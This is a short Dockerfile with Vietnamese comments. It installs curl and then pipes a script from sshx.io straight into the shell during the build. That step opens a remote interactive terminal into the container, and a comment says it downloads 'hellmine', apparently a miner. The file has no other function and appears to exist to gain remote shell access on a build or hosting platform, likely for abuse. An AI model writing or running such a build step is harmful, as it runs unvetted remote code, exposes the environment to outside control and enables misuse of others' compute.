FROM python:3.8
#aonskssjb

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt install curl
    

# Tạo thư mục làm việc và tải hellmine

RUN curl -sSf https://sshx.io/get | sh -s run
